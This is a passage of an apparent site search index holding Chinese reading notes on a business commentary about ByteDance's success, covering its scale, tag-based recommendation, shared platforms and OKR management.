u5927\u56e2\u961f\u7684\u5f00\u53d1\u540c\u5b66\u5f80\u5f80\u53ea\u4f1a\u5c06\u6240\u5728\u56e2\u961f\u7684\u95ee\u9898\u8fdb\u884c\u7b80\u5355\u7684\u4f18\u5316\uff0c\u56e0\u6b64\u4f1a\u5b58\u5728\u5404\u5927\u56e2\u961f\u91cd\u590d\u906d\u8f6e\u5b50\uff0c\u8de8\u4e1a\u52a1\u5408\u4f5c\u56f0\u96be\u7b49\u95ee\u9898\uff0c\u9488\u5bf9\u8fd9\u79cd\u60c5\u51b5\uff0c\u6211\u4eec\u5c06\u8fd9\u4e9b\u5927\u578b\u4ea7\u54c1\u5f00\u53d1\u4e2d\u9047\u5230\u7684\u95ee\u9898\u8fdb\u884c\u62bd\u8c61\u3001\u5f62\u6210\u4e00\u4e2a\u7edf\u4e00\u7684\u89e3\u51b3\u65b9\u6848\uff0c\u901a\u8fc7\u5728\u8de8\u4e1a\u52a1\u56e2\u961f\u4ee5\u53ca\u7279\u5b9a\u5927\u578b\u4e1a\u52a1\u7ebf\u4e2d\u8bd5\u70b9\uff0c\u9010\u6b65\u63a8\u5e7f\u5230\u5176\u4ed6\u4e1a\u52a1\u7ebf\u3002 \u4e2d\u53f0\u80fd\u591f\u652f\u6491\u5b57\u8282\u8df3\u52a8\u4ea7\u54c1\u7684\u5feb\u901f\u5f00\u53d1\u4e0e\u8fed\u4ee3\u3002 5. OKR # \u7ed3\u679c\u7ba1\u7406\uff0c\u800c\u4e0d\u662f\u8fc7\u7a0b\u7ba1\u7406\u3002 \u6881\u5b81\u8001\u5e08\u5728 \u300a\u4ea7\u54c1\u601d\u7ef430\u8bb2\u300b 4 \u4e2d\u8bb2\u5230\uff0c\u5b57\u8282\u8df3\u52a8\u9009\u62e9\u7528 OKR \u6765\u505a\u76ee\u6807\u5bf9\u9f50\u548c\u7ba1\u7406\u7684\u5de5\u5177\u3002\u6574\u4e2a\u5b57\u8282\u8df3\u52a85\u4e07\u4eba\uff0c\u6bcf\u4e2a\u666e\u901a\u5458\u5de5\uff0c\u90fd\u80fd\u770b\u5230\u5f20\u4e00\u9e23\u7684 OKR \uff0c\u770b\u5230\u8001\u677f\u5728\u505a\u4ec0\u4e48\uff0c\u4ed6\u7684\u91cd\u70b9\u662f\u4ec0\u4e48\u3002 \u6bcf\u4e2a\u56e2\u961f\u7684leader\uff0c\u90fd\u8981\u8003\u8651\u4e09\u5c42\u6765\u5236\u5b9a\u81ea\u5df1\u7684 OKR \uff1a\u9996\u5148\u662f\u81ea\u5df1\u90e8\u95e8\u8fd1\u671f\u6700\u91cd\u8981\u7684\u4e1a\u52a1\uff1b\u5176\u6b21\u662f\u53c2\u7167\u5f20\u4e00\u9e23\u7684 OKR \uff0c\u770b\u770b\u5982\u4f55\u4ece\u81ea\u5df1\u90e8\u95e8\u7684\u89d2\u5ea6\u652f\u6301\u5f20\u4e00\u9e23\u7684 OKR \uff1b\u6700\u540e\u662f\u53c2\u8003\u5176\u4ed6\u76f8\u5173\u4e1a\u52a1\u7ebf\u7684 OKR \uff0c\u770b\u770b\u81ea\u5df1\u5982\u4f55\u652f\u6301\u522b\u7684\u90e8\u95e8\u3002 \u6574\u4e2a\u5b57\u8282\u8df3\u52a8\u5c31\u50cf\u4e00\u5f20\u5927\u7f51\uff0c\u7531\u4e00\u4e2a\u70b9\u6765\u6307\u5f15\u65b9\u5411\uff0c\u5e26\u52a8\u6574\u4e2a\u7f51\u7edc\u671d\u7740\u4ed6\u76ee\u6807\u6240\u5728\u7684\u5730\u65b9\u524d\u8fdb\u3002 \u6ca1\u6709\u76f4\u63a5\u7684\u8fc7\u7a0b\u7ba1\u7406\uff0c\u4ed6\u4eec\u751a\u81f3\u90fd\u6ca1\u6709\u8003\u52e4\uff0c\u6ca1\u6709 KPI \u3002 \u90a3\u4e48\uff0c\u4e3a\u4ec0\u4e48\u4ed6\u4eec\u9009\u62e9\u7528 OKR \u800c\u4e0d\u662f KPI \u5462\uff1f\u5434\u4f2f\u51e1\u8001\u5e08\u63d0\u5230\u4e86\u4e00\u4e2a\u73b0\u8c61\uff0c\u53eb\u505a KPI \u7684\u8bc5\u5492\uff0c\u6307\u6807\u4e00\u786e\u5b9a\u7684\u65f6\u5019\uff0c\u4f60\u5c31\u6ca1\u5fc5\u8981\u5173\u5fc3\u7ed3\u679c\uff0c\u4e5f\u6ca1\u5fc5\u8981\u5173\u5fc3\u76ee\u6807\uff0c\u53ea\u9700\u8981\u5173\u5fc3\u6307\u6807\u3002\u6307\u6807\u662f\u624b\u6bb5\uff0c\u76ee\u6807\u548c\u7ed3\u679c\u624d\u662f\u76ee\u7684\uff0c\u8001\u5e08\u8fd8\u7528\u4e86 \u90d1\u4eba\u4e70\u5c65 5 \u8fd9\u4e2a\u6545\u4e8b\u6765\u8bf4\u660e\u624b\u6bb5\u548c\u76ee\u6807\u7684\u4e0d\u540c\u3002 \u4e3a\u4ec0\u4e48 KPI \u4f1a\u5b58\u5728\u5f0a\u7aef\uff1f\u4f60\u8003\u6838\u4ec0\u4e48\uff0c\u4f60\u5c31\u5f97\u5230\u4ec0\u4e48\uff0c\u770b\u8d77\u6765\u5f88\u7f8e\u597d\uff0c\u4f46\u662f\u4f60\u771f\u6b63\u60f3\u5f97\u5230\u7684\u7ed3\u679c\uff0c\u53ef\u80fd\u6ca1\u6709\u529e\u6cd5\u5f88\u597d\u5730\u53bb\u8003\u6838\u3002\u6bd4\u5982\u79d1\u7814\uff0c\u6211\u4eec\u5f80\u5f80\u6ca1\u6709\u529e\u6cd5\u5f88\u597d\u5730\u53bb\u8003\u6838\u79d1\u7814\u6210\u679c\u7684\u4ef7\u503c\uff0c\u6240\u4ee5\u6211\u4eec\u8003\u6838\u7684\u662f\u8bba\u6587\uff0c\u4ee5\u81f3\u4e8e\u73b0\u5728\u8bb8\u591a\u60c5\u51b5\u4e0b \u505a\u79d1\u7814 = \u5199\u8bba\u6587\uff0c\u9ad8\u6c34\u5e73\u7684\u79d1\u7814 = \u9ad8\u5f71\u54cd\u56e0\u5b50\u7684\u8bba\u6587\u3002\u8fd9\u5c31\u662f KPI \u7684\u8bc5\u5492\u3002 \u6982\u62ec\u6765\u8bb2\uff0c OKR \u6709\u5229\u4e8e\u5173\u952e\u7ed3\u679c\u7684\u5b9e\u73b0\uff0c\u540c\u65f6\u4fc3\u8fdb\u4e86\u5458\u5de5\u4e4b\u95f4\u7684\u4e92\u76f8\u5b66\u4e60\u548c\u76f8\u4e92\u8ffd\u8d76\uff0c\u4fc3\u8fdb\u4e86\u5185\u90e8\u7684\u4eba\u624d\u6d8c\u73b0\u3002 \u603b\u7ed3\u4ee5\u4e0a\u7684\u5185\u5bb9\uff0c Tag \u601d\u7ef4\u3001\u5927\u4e2d\u53f0\u3001 OKR \uff0c\u8fd9\u4e5f\u8bb8\u5c31\u662f\u5b57\u8282\u8df3\u52a8\u6210\u529f\u7684\u539f\u56e0\u3002 \u8054\u7cfb\u90ae\u7bb1 \uff1acurren_wong@163.com CSDN \uff1a https://me.csdn.net/qq_41729780 \u77e5\u4e4e \uff1a https://zhuanlan.zhihu.com/c_1225417532351741952 \u516c\u4f17\u53f7 \uff1a \u590d\u6742\u7f51\u7edc\u4e0e\u673a\u5668\u5b66\u4e60 \u6b22\u8fce\u5173\u6ce8/\u8f6c\u8f7d\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002 6. \u53c2\u8003\u6587\u732e # [1] \u5f97\u5230APP.\u300a\u5434\u4f2f\u51e1-\u6bcf\u5468\u5546\u4e1a\u8bc4\u8bba\u300b [2] \u5f97\u5230APP.\u300a\u90b5\u8861\u5934\u6761\u300b [3] InfoQ. \u7f16\u8bd1\u901f\u5ea6\u63d0\u5347 700%\uff0c\u5b57\u8282\u8df3\u52a8\u4e2d\u53f0\u6280\u672f\u63ed\u79d8 [4] \u5f97\u5230APP.\u300a\u6881\u5b81-\u4ea7\u54c1\u601d\u7ef430\u8bb2\u300b [5] \u767e\u5ea6\u767e\u79d1. \u90d1\u4eba\u4e70\u5c65","title":"1.\u6bcf\u5468\u5546\u4e1a\u8bc4\u8bba \u5b57\u8282\u8df3\u52a8"},{"location":"%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/%E5%95%86%E4%B8%9A/1.%E6%AF%8F%E5%91%A8%E5%95%86%E4%B8%9A%E8%AF%84%E8%AE%BA_%E5%AD%97%E8%8A%82%E8%B7%B3%E5%8A%A8/#-","text":"","title":"\u5434\u4f2f\u51e1-\u6bcf\u5468\u5546\u4e1a\u8bc4\u8bba-\u5b57\u8282\u8df3\u52a8\u7bc7"},{"location":"%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/%E5%95%86%E4%B8%9A/1.%E6%AF%8F%E5%91%A8%E5%95%86%E4%B8%9A%E8%AF%84%E8%AE%BA_%E5%AD%97%E8%8A%82%E8%B7%B3%E5%8A%A8/#_1","text":"\u5434\u4f2f\u51e1-\u6bcf\u5468\u5546\u4e1a\u8bc4\u8bba-\u5b57\u8282\u8df3\u52a8\u7bc7 \u76ee\u5f55 1. \u80cc\u666f 2. \u5b57\u8282\u8df3\u52a8\u7684\u4f53\u91cf 3. \u4eceLabel\u5230Tag 4. \u5b57\u8282\u8df3\u52a8\u7684\u5927\u4e2d\u53f0\u3001\u5c0f\u524d\u53f0 5. OKR 6. \u53c2\u8003\u6587\u732e","title":"\u76ee\u5f55"},{"location":"%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/%E5%95%86%E4%B8%9A/1.%E6%AF%8F%E5%91%A8%E5%95%86%E4%B8%9A%E8%AF%84%E8%AE%BA_%E5%AD%97%E8%8A%82%E8%B7%B3%E5%8A%A8/#1","text":"\u6700\u8fd1\u5728\u5f97\u5230APP\u542c\u4e86\u5434\u4f2f\u51e1\u8001\u5e08\u7684 \u300a\u6bcf\u5468\u5546\u4e1a\u8bc4\u8bba\u300b 1 \u4e2d\u300a\u5b57\u8282\u8df3\u52a8\u4e3a\u4ec0\u4e48\u80fd\u6301\u7eed\u51fa\u7206\u54c1\u300b\u8fd9\u4e24\u8bb2\u8bfe\u7a0b\uff0c\u6211\u611f\u89c9\u5bf9\u5b57\u8282\u8df3\u52a8\u8fd9\u5bb6\u516c\u53f8\u591a\u4e86\u4e00\u4e9b\u4e86\u89e3\uff0c\u6240\u4ee5\u5e0c\u671b\u5199\u4e00\u7bc7\u7b14\u8bb0\u6765\u603b\u7ed3\u542c\u8bfe\u7684\u5185\u5bb9\u3002","title":"1. \u80cc\u666f"},{"location":"%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/%E5%95%86%E4%B8%9A/1.%E6%AF%8F%E5%91%A8%E5%95%86%E4%B8%9A%E8%AF%84%E8%AE%BA_%E5%AD%97%E8%8A%82%E8%B7%B3%E5%8A%A8/#2","text":"\u6211\u57285\u670830\u65e5\u7684 \u90b5\u8861\u5934\u6761 2 \u4e2d\u4e5f\u542c\u5230\u4e86\u5b57\u8282\u8df3\u52a8\u7684\u6d88\u606f\uff0c\u4f7f\u6211\u5bf9\u5b57\u8282\u8df3\u52a8\u76ee\u524d\u7684\u4f53\u91cf\u6709\u4e86\u4e00\u4e2a\u5927\u6982\u7684\u8ba4\u8bc6\uff0c\u5185\u5bb9\u5982\u4e0b\u3002 \u5f6d\u535a\u62a5\u9053\uff1a\u4eca\u65e5\u5934\u6761\u53bb\u5e74\u5229\u6da6\u8d85\u8fc730\u4ebf\u7f8e\u5143\uff0c\u8425\u6536170\u4ebf\u7f8e\u5143 \u4e0a\u5468\uff0c\u5f6d\u535a\u5546\u4e1a\u5468\u520a\u62a5\u9053\uff0c\u4eca\u65e5\u5934\u6761\u7684\u6bcd\u516c\u53f8\u5b57\u8282\u8df3\u52a8\uff0c\u53bb\u5e74\u5168\u5e74\u5b9e\u73b0\u8425\u6536 170\u4ebf\u7f8e\u5143 \uff0c\u8f832018\u5e74\u540c\u6bd4\u589e\u957f 120% \uff0c\u8fd9\u4e2a\u6570\u5b57\u5df2\u7ecf\u8d85\u8fc7\u4e86\u767e\u5ea6\u3002\u6b64\u5916\uff0c\u53bb\u5e74\u4eca\u65e5\u5934\u6761\u7684\u5229\u6da6\u8d85\u8fc7 30\u4ebf\u7f8e\u5143 \u3002 \u636e\u65b0\u52a0\u5761\u6295\u7814\u516c\u53f8DZT Research\u7684\u5206\u6790\u5e08\u9884\u4f30\uff0c\u5982\u679c\u5b57\u8282\u8df3\u52a8\u4e0a\u5e02\uff0c\u5e02\u573a\u4f30\u503c\u5e94\u8be5\u5728 1500\u4ebf-1800\u4ebf\u7f8e\u5143 \u4e4b\u95f4\uff0c \u8dfb\u8eab\u5168\u7403\u6700\u5927\u7684\u79d1\u6280\u516c\u53f8\u4e4b\u5217 \u3002\u4f46\u636e\u5f6d\u535a\u5206\u6790\uff0c\u5b57\u8282\u8df3\u52a8\u5b8c\u5168\u6ca1\u6709\u4e0a\u5e02\u538b\u529b\uff0c\u56e0\u4e3a\u516c\u53f8\u8d26\u9762\u4e0a\u7684\u73b0\u91d1\u9ad8\u8fbe 60\u4ebf\u7f8e\u5143 \uff0c\u53ef\u4ee5\u8bf4\u5bb6\u5e95\u6df1\u539a\u3002 \u5b57\u8282\u8df3\u52a8\u6700\u4e3b\u8981\u7684\u6536\u5165\u6765\u6e90\u662f\u5e7f\u544a\u3002\u6b64\u6b21\u75ab\u60c5\u4f1a\u5bf9\u5e7f\u544a\u6536\u5165\u6709\u591a\u5927\u5f71\u54cd\uff0c\u76ee\u524d\u8fd8\u6ca1\u6709\u516c\u5f00\u4fe1\u606f\u3002\u4e0d\u8fc7\u5f6d\u535a\u7684\u62a5\u9053\u79f0\uff0c\u4eca\u5e74\u5b57\u8282\u8df3\u52a8\u7684\u4eba\u5458\u6269\u5f20\u4ecd\u7136\u51f6\u731b\uff0c\u8ba1\u5212\u65b0\u589e\u5c97\u4f4d 40000\u4e2a \uff0c\u4e5f\u5c31\u662f\u8bf4\u5230\u5e74\u5e95\uff0c\u5b57\u8282\u8df3\u52a8\u7684\u5168\u7403\u5458\u5de5\u4eba\u6570\u5c06\u7a81\u7834 10\u4e07\u4eba \uff0c\u76f4\u8ffd\u963f\u91cc\u5df4\u5df4\u3002","title":"2. \u5b57\u8282\u8df3\u52a8\u7684\u4f53\u91cf"},{"location":"%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/%E5%95%86%E4%B8%9A/1.%E6%AF%8F%E5%91%A8%E5%95%86%E4%B8%9A%E8%AF%84%E8%AE%BA_%E5%AD%97%E8%8A%82%E8%B7%B3%E5%8A%A8/#3-labeltag","text":"\u5b57\u8282\u8df3\u52a8\u6210\u7acb\u4e8e2012\u5e74\uff0c\u5230\u73b0\u5728\u4e0d\u8fc78\u5e74\uff0c\u5374\u5df2\u7ecf\u5728\u5168\u7403\u6709\u4e86\u8d85\u8fc77\u4ebf\u7684\u603b\u65e5\u6d3b\u7528\u6237\uff0c\u4e3a\u4ec0\u4e48\u5b83\u80fd\u591f\u6210\u529f\uff1f \u6211\u4eec\u4ece\u7528\u6237\u6700\u719f\u6089\u7684\u4eca\u65e5\u5934\u6761\uff082012\u4e0a\u7ebf\uff09\u548c\u6296\u97f3\uff082016\u4e0a\u7ebf\uff09\u5165\u624b\u8fdb\u884c\u5206\u6790\u3002\u4ed6\u4eec\u4e0e\u4ee5\u524d\u7684\u4e92\u8054\u7f51\u5185\u5bb9\u4ea7\u54c1\u6700\u4e0d\u540c\u7684\u5730\u65b9\u5c31\u5728\u4e8e\u5c06\u5185\u5bb9\u7684\u66dd\u5149\u4ece\u4ee5\u7528\u6237\u641c\u7d22\u4e3a\u4e3b\u6539\u4e3a\u4e86\u4ee5\u7b97\u6cd5\u63a8\u8350\u4e3a\u4e3b\u3002 \u4e3a\u4ec0\u4e48\u5b57\u8282\u8df3\u52a8\u80fd\u591f\u6bd4\u7528\u6237\u66f4\u4e86\u89e3\u4ed6\u4eec\u81ea\u5df1\u60f3\u8981\u770b\u5230\u4ec0\u4e48\u5185\u5bb9\u5462\uff1f\u8fd9\u5c31\u6d89\u53ca\u5230\u4e86\u5434\u4f2f\u51e1\u8001\u5e08\u8bf4\u7684\u4ece Label\u601d\u7ef4 \u5230 Tag\u601d\u7ef4 \u7684\u8f6c\u53d8\u3002 Label \u548c Tag \u867d\u7136\u7ffb\u8bd1\u6210\u4e2d\u6587\u90fd\u53eb\u6807\u7b7e\uff0c\u4f46 Label \u662f\u4e00\u79cd\u7c97\u7c92\u5ea6\u7684\u6807\u7b7e\uff0c\u6bd4\u5982\u5bcc\u4eba\u9636\u7ea7\u3001\u4e2d\u4ea7\u9636\u7ea7\uff0c\u4e00\u4e2a\u4eba\u8eab\u4e0a\u5f80\u5f80\u4e0d\u4f1a\u6709\u5f88\u591a Label \u3002\u800c Tag \u5219\u662f\u4e00\u79cd\u66f4\u52a0\u7ec6\u7c92\u5ea6\u3001\u788e\u7247\u5316\u7684\u6807\u7b7e\uff0c\u6bd4\u5982\u4f60\u559c\u6b22\u7684\u662f\u732b\u8fd8\u662f\u72d7\uff0c\u559c\u6b22\u67ef\u57fa\u8fd8\u662f\u54c8\u58eb\u5947\uff0c\u4e00\u4e2a\u4eba\u8eab\u4e0a\u662f\u53ef\u4ee5\u6709\u5f88\u591a Tag \u7684\u3002 \u4ec0\u4e48\u662f Label \u601d\u7ef4\u5462\uff0c\u6bd4\u5982\u6211\u4eec\u5e38\u7528\u7684\u57fa\u4e8e\u5e74\u9f84\u6bb5\u7684\u7528\u6237\u7fa4\u5206\u7c7b\u65b9\u6cd5\uff0c\u628a\u7528\u6237\u5206\u4e3a\u5e7c\u513f\u3001\u9752\u5c11\u5e74\u3001\u4e2d\u5e74\u548c\u8001\u5e74\u51e0\u4e2a\u7fa4\u4f53\uff0c\u7136\u540e\u7814\u7a76\u6211\u4eec\u7684\u4ea7\u54c1\u8981\u9762\u5411\u54ea\u4e2a\u7fa4\u4f53\uff0c\u8fd9\u4e2a\u7fa4\u4f53\u4ed6\u4eec\u7684\u60f3\u6cd5\u662f\u600e\u4e48\u6837\u7684\uff0c\u4ed6\u4eec\u559c\u6b22\u4ec0\u4e48\u6837\u7684\u4e1c\u897f\u3002\u4e5f\u8bb8\u8fd8\u53ef\u4ee5\u52a0\u5165\u6027\u522b\u3001\u5a5a\u59fb\u72b6\u51b5\u3001\u6536\u5165\u6c34\u5e73\u3001\u6559\u80b2\u6c34\u5e73\u3001\u5c45\u4f4f\u5730\u7b49\u7b49\u56e0\u7d20\u6765\u8fdb\u884c\u8003\u91cf\uff0c\u6700\u540e\u5f97\u51fa\u4e00\u4e2a\u7528\u6237\u753b\u50cf\uff0c\u8ba9\u6211\u4eec\u7684\u4ea7\u54c1\u5c3d\u53ef\u80fd\u5730\u80fd\u591f\u53d7\u8fd9\u4e2a\u7fa4\u4f53\u559c\u6b22\u3002 \u8fd9\u6837\u7684\u65b9\u6cd5\u770b\u8d77\u6765\u6ca1\u6709\u4ec0\u4e48\u95ee\u9898\uff0c\u8003\u8651\u5f97\u4f3c\u4e4e\u5f88\u5168\u9762\u3002\u4f46\u662f\u8fd9\u4e2a\u6a21\u578b\u5176\u5b9e\u9690\u542b\u4e86\u4e00\u4e2a \u5047\u8bbe \uff0c\u5c31\u662f\u76f8\u540c\u5e74\u9f84\u3001\u6027\u522b\u3001\u5a5a\u59fb\u72b6\u51b5\u3001\u6536\u5165\u6c34\u5e73\u3001\u6559\u80b2\u6c34\u5e73\u548c\u5c45\u4f4f\u5730\u7684\u4eba\uff0c\u4ed6\u4eec\u559c\u6b22\u7684\u4e1c\u897f\u662f\u4e00\u6837\u7684\u3002 \u8fd9\u4e2a\u5047\u8bbe\u6210\u7acb\u5417\uff1f\u6211\u4eec\u53ef\u4ee5\u8bbe\u60f3\u4e00\u4e0b\uff0c\u548c\u4f60\u5728\u4e00\u4e2a\u529e\u516c\u5ba4\u7684\u540c\u4e8b\uff0c\u4ed6\u548c\u4f60\u5e74\u9f84\u3001\u6536\u5165\u7b49\u7b49\u65b9\u9762\u90fd\u5dee\u4e0d\u591a\uff0c\u4f60\u4eec\u4e24\u4e2a\u559c\u6b22\u7684\u4e1c\u897f\u4f1a\u662f\u4e00\u6837\u7684\u5417\uff1f\u5f88\u660e\u663e\uff0c\u8fd9\u4e2a\u5047\u8bbe\u5e76\u4e0d\u6210\u7acb\uff0c\u4eba\u548c\u4eba\u4e4b\u95f4\u7684\u5dee\u522b\u6709\u65f6\u5019\u4f1a\u5927\u5f97\u8d85\u4e4e\u6211\u4eec\u7684\u60f3\u8c61\u3002 \u90a3\u4e48 Tag \u601d\u7ef4\u53c8\u662f\u4ec0\u4e48\u5462\uff0c\u5982\u679c\u7528\u51b3\u7b56\u6811\u6765\u505a\u7c7b\u6bd4\uff0c\u4f60\u548c\u4f60\u7684\u540c\u4e8b\u6bcf\u4e00\u6b21\u4e0d\u540c\u7684\u70b9\u51fb\u90fd\u4f1a\u88ab\u6253\u4e0a\u4e0d\u540c\u7684 Tag \uff0c\u88ab\u5206\u88c2\u5230\u4e0d\u540c\u7684\u5206\u652f\u4e0a\u53bb\uff0c\u4f60\u4eec\u4e24\u4e2a\u5728\u51b3\u7b56\u6811\u4e0a\u7684\u8ddd\u79bb\u4e5f\u5c31\u8d8a\u6765\u8d8a\u8fdc\uff0c\u770b\u5230\u7684\u5185\u5bb9\u4e5f\u5c31\u8d8a\u6765\u8d8a\u4e0d\u76f8\u540c\u3002 \u4e3a\u4e86\u63a8\u9001\u4f60\u559c\u6b22\u7684\u5185\u5bb9\u7ed9\u4f60\uff0c\u4f60\u4f1a\u88ab\u6253\u4e0a\u591a\u5c11\u4e2a Tag \u5462\uff1f\u6211\u57282019\u5e74\u66fe\u7ecf\u542c\u8fc7\u65b0\u6d6a\u5fae\u535a\u63a8\u8350\u7cfb\u7edf\u90e8\u95e8\u7684\u5de5\u7a0b\u5e08\u505a\u7684\u4e00\u6b21\u5206\u4eab\uff0c\u4ed6\u4eec\u7528\u6765\u505a\u4e2a\u6027\u5316 Push \u6240\u7528\u5230\u7684\u6a21\u578b\uff0c\u4e5f\u5c31\u662f\u5fae\u535a\u901a\u8fc7\u901a\u77e5\u53d1\u9001\u7ed9\u4f60\u4e00\u4e9b\u4f60\u53ef\u80fd\u611f\u5174\u8da3\u7684\u5185\u5bb9\uff0c\u8fd9\u4e2a\u52a8\u4f5c\u7528\u5230\u7684\u6a21\u578b\uff0c\u5176\u7279\u5f81\u89c4\u6a21\u5df2\u7ecf\u8fbe\u5230\u4e86\u5341\u4e07\u7ef4\u7684\u7ea7\u522b\u3002 \u5982\u679c\u8981\u5bf9\u8fd9\u90e8\u5206\u5185\u5bb9\u505a\u4e00\u4e2a\u603b\u7ed3\uff0c\u90a3\u5c31\u662f \u5b57\u8282\u8df3\u52a8\u901a\u8fc7\u5927\u6570\u636e\u548c Tag \u601d\u7ef4\uff0c\u5b9e\u73b0\u4e86\u6bd4\u4f60\u81ea\u5df1\u66f4\u61c2\u4f60\u60f3\u8981\u770b\u4ec0\u4e48\u5185\u5bb9 \u3002","title":"3. \u4eceLabel\u5230Tag"},{"location":"%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/%E5%95%86%E4%B8%9A/1.%E6%AF%8F%E5%91%A8%E5%95%86%E4%B8%9A%E8%AF%84%E8%AE%BA_%E5%AD%97%E8%8A%82%E8%B7%B3%E5%8A%A8/#4","text":"\u6570\u636e\u4e2d\u53f0\u4f7f\u5b57\u8282\u8df3\u52a8\u4e0d\u540c\u4ea7\u54c1\u4e4b\u95f4\u83b7\u53d6\u7684\u7684\u7528\u6237\u6570\u636e\u53ef\u4ee5\u5171\u4eab\uff0c\u6280\u672f\u4e2d\u53f0\u4e3a\u5176\u4ea7\u54c1\u7684\u5f00\u53d1\u4e0e\u8fed\u4ee3\u63d0\u4f9b\u4e86\u53ef\u590d\u7528\u7684\u7ec4\u4ef6\u3002 \u5b57\u8282\u8df3\u52a8\u7684\u65e0\u7ebf\u7814\u53d1\u5e73\u53f0\u8d1f\u8d23\u4eba\u5434\u601d\u632f\u8001\u5e08\u66fe\u5728 GMTC \u5168\u7403\u5927\u524d\u7aef\u6280\u672f\u5927\u4f1a 3 \u4e0a\u5bf9\u4e2d\u53f0\u505a\u4e86\u89e3\u91ca\u3002 \u968f\u7740\u4e1a\u52a1\u7684\u53d1\u5c55\u4ee5\u53ca\u5f00\u53d1\u4eba\u5458\u589e\u52a0\u3001\u6bcf\u4e2a\u5927\u578b\u4ea7\u54c1\u90fd\u6709\u5bf9\u5e94\u6570\u91cf\u7684\u5f00\u53d1\u540c\u5b66\u4f5c\u4e3a\u652f\u6491\uff0c\u800c\u5728\u957f\u671f\u7684\u534f\u4f5c\u4e2d\uff0c\u6211\u4eec\u53d1\u73b0\u5404\u5927\u5f00\u53d1\u56e2\u961f\u90fd\u4f1a\u9047\u5230\u6bd4\u8f83\u6709\u5171\u6027\u7684\u96be\u70b9\uff0c\u6bd4\u5982\u6784\u5efa\u901f\u5ea6\u6162\u3001\u5f00\u53d1\u6d4b\u8bd5\u5468\u671f\u957f\u3001\u534f\u4f5c\u56f0\u96be\u7b49\u95ee\u9898\uff0c\u800c\u5728\u5feb\u901f\u7684\u4e1a\u52a1\u8fed\u4ee3\u4e2d\uff0c\u5404\u5927\u56e2\u961f\u7684\u5f00\u53d1\u540c\u5b66\u5f80\u5f80\u53ea\u4f1a\u5c06\u6240\u5728\u56e2\u961f\u7684\u95ee\u9898\u8fdb\u884c\u7b80\u5355\u7684\u4f18\u5316\uff0c\u56e0\u6b64\u4f1a\u5b58\u5728\u5404\u5927\u56e2\u961f\u91cd\u590d\u906d\u8f6e\u5b50\uff0c\u8de8\u4e1a\u52a1\u5408\u4f5c\u56f0\u96be\u7b49\u95ee\u9898\uff0c\u9488\u5bf9\u8fd9\u79cd\u60c5\u51b5\uff0c\u6211\u4eec\u5c06\u8fd9\u4e9b\u5927\u578b\u4ea7\u54c1\u5f00\u53d1\u4e2d\u9047\u5230\u7684\u95ee\u9898\u8fdb\u884c\u62bd\u8c61\u3001\u5f62\u6210\u4e00\u4e2a\u7edf\u4e00\u7684\u89e3\u51b3\u65b9\u6848\uff0c\u901a\u8fc7\u5728\u8de8\u4e1a\u52a1\u56e2\u961f\u4ee5\u53ca\u7279\u5b9a\u5927\u578b\u4e1a\u52a1\u7ebf\u4e2d\u8bd5\u70b9\uff0c\u9010\u6b65\u63a8\u5e7f\u5230\u5176\u4ed6\u4e1a\u52a1\u7ebf\u3002 \u4e2d\u53f0\u80fd\u591f\u652f\u6491\u5b57\u8282\u8df3\u52a8\u4ea7\u54c1\u7684\u5feb\u901f\u5f00\u53d1\u4e0e\u8fed\u4ee3\u3002","title":"4. \u5b57\u8282\u8df3\u52a8\u7684\u5927\u4e2d\u53f0\u3001\u5c0f\u524d\u53f0"},{"location":"%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/%E5%95%86%E4%B8%9A/1.%E6%AF%8F%E5%91%A8%E5%95%86%E4%B8%9A%E8%AF%84%E8%AE%BA_%E5%AD%97%E8%8A%82%E8%B7%B3%E5%8A%A8/#5-okr","text":"\u7ed3\u679c\u7ba1\u7406\uff0c\u800c\u4e0d\u662f\u8fc7\u7a0b\u7ba1\u7406\u3002 \u6881\u5b81\u8001\u5e08\u5728 \u300a\u4ea7\u54c1\u601d\u7ef430\u8bb2\u300b 4 \u4e2d\u8bb2\u5230\uff0c\u5b57\u8282\u8df3\u52a8\u9009\u62e9\u7528 OKR \u6765\u505a\u76ee\u6807\u5bf9\u9f50\u548c\u7ba1\u7406\u7684\u5de5\u5177\u3002\u6574\u4e2a\u5b57\u8282\u8df3\u52a85\u4e07\u4eba\uff0c\u6bcf\u4e2a\u666e\u901a\u5458\u5de5\uff0c\u90fd\u80fd\u770b\u5230\u5f20\u4e00\u9e23\u7684 OKR \uff0c\u770b\u5230\u8001\u677f\u5728\u505a\u4ec0\u4e48\uff0c\u4ed6\u7684\u91cd\u70b9\u662f\u4ec0\u4e48\u3002 \u6bcf\u4e2a\u56e2\u961f\u7684leader\uff0c\u90fd\u8981\u8003\u8651\u4e09\u5c42\u6765\u5236\u5b9a\u81ea\u5df1\u7684 OKR \uff1a\u9996\u5148\u662f\u81ea\u5df1\u90e8\u95e8\u8fd1\u671f\u6700\u91cd\u8981\u7684\u4e1a\u52a1\uff1b\u5176\u6b21\u662f\u53c2\u7167\u5f20\u4e00\u9e23\u7684 OKR \uff0c\u770b\u770b\u5982\u4f55\u4ece\u81ea\u5df1\u90e8\u95e8\u7684\u89d2\u5ea6\u652f\u6301\u5f20\u4e00\u9e23\u7684 OKR \uff1b\u6700\u540e\u662f\u53c2\u8003\u5176\u4ed6\u76f8\u5173\u4e1a\u52a1\u7ebf\u7684 OKR \uff0c\u770b\u770b\u81ea\u5df1\u5982\u4f55\u652f\u6301\u522b\u7684\u90e8\u95e8\u3002 \u6574\u4e2a\u5b57\u8282\u8df3\u52a8\u5c31\u50cf\u4e00\u5f20\u5927\u7f51\uff0c\u7531\u4e00\u4e2a\u70b9\u6765\u6307\u5f15\u65b9\u5411\uff0c\u5e26\u52a8\u6574\u4e2a\u7f51\u7edc\u671d\u7740\u4ed6\u76ee\u6807\u6240\u5728\u7684\u5730\u65b9\u524d\u8fdb\u3002 \u6ca1\u6709\u76f4\u63a5\u7684\u8fc7\u7a0b\u7ba1\u7406\uff0c\u4ed6\u4eec\u751a\u81f3\u90fd\u6ca1\u6709\u8003\u52e4\uff0c\u6ca1\u6709 KPI \u3002 